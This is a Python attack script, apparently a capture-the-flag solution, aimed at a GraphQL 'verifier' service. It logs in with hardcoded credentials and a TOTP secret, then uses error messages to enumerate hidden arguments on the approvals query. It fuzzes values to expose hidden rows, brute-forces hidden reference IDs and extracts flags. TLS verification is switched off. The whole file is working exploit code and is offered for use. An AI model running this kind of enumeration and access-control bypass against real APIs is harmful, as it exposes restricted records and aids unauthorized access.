#!/usr/bin/env python3
"""Verifier GraphQL: enumerate valid ARGUMENT NAMES on approvals/allApprovals, then exploit."""
import re, json, base64, hmac, hashlib, struct, time
import requests, urllib3
urllib3.disable_warnings()
V="https://verifier.hackthe.website"; TOTP_SECRET="JBSWY3DPEHPK3PXP"
FLAG_RE=re.compile(r'dome\.ctf\{[^}]+\}')
def totp():
    k=base64.b32decode(TOTP_SECRET)
    h=hmac.new(k,struct.pack(">Q",int(time.time()//30)),hashlib.sha1).digest()
    o=h[-1]&15
    return str((struct.unpack(">I",h[o:o+4])[0]&0x7fffffff)%10**6).zfill(6)
s=requests.Session(); s.verify=False
s.headers.update({"User-Agent":"Mozilla/5.0","Content-Type":"application/json"})
s.post(f"{V}/api/login", json={"username":"ops_dispatcher","password":"Ops-Fall-2026!"}, timeout=20)
s.post(f"{V}/api/otp/verify", json={"otp":totp()}, timeout=20)
def gql(q):
    return s.post(f"{V}/graphql", json={"query":q}, timeout=20).text

# 1) enumerate argument names (Unknown argument 'X' => invalid)
argnames=["status","role","approvedBy","visibility","visible","hidden","type","category","level",
 "classification","scope","ref","limit","first","offset","after","filter","where","includeHidden",
 "all","showAll","service","principal","id","ids","pending","state","stage","sealed","internal",
 "restricted","order","sort","page","q","search","name","approver"]
valid_args=[]
for a in argnames:
    t=gql('{approvals(%s:"x"){id}}'%a)
    if "Unknown argument '%s'"%a not in t:
        # could be type error (wrong value type) but arg exists
        valid_args.append(a)
        # show the message to learn expected type
        try:
            errs=json.loads(t).get("errors")
            msg = errs[0] if errs else "(ok)"
        except: msg=t[:120]
        print(f"  ARG '{a}' EXISTS: {str(msg)[:160]}")
print("\nvalid args:", valid_args)

# 2) for each valid arg, try boolean/int values that could reveal hidden rows
baseline={"AP-1001","AP-1002","AP-1003","AP-1007","AP-1009","AP-1010","AP-1011"}
def ids_of(t):
    try: return {a["id"] for a in json.loads(t)["data"]["approvals"]}
    except: return set()
for a in valid_args:
    for val in ['true','false','0','100','null','"true"','"ALL"','"*"']:
        t=gql('{approvals(%s:%s){id approvedBy ref}}'%(a,val))
        got=ids_of(t)
        if got and got!=baseline:
            print(f"\n  approvals({a}:{val}) -> {t[:600]}")
            for m in FLAG_RE.finditer(t): print("    *** FLAG:", m.group())

# 3) brute the hidden refs directly if approvals accepts ref arg
if "ref" in valid_args:
    for n in range(1004,1009):
        t=gql('{approvals(ref:"AP-%d"){id approvedBy ref}}'%n)
        print(f"  ref AP-{n}: {t[:200]}")

for m in FLAG_RE.finditer(gql("{approvals{id approvedBy ref}}")): print("FLAG:", m.group())
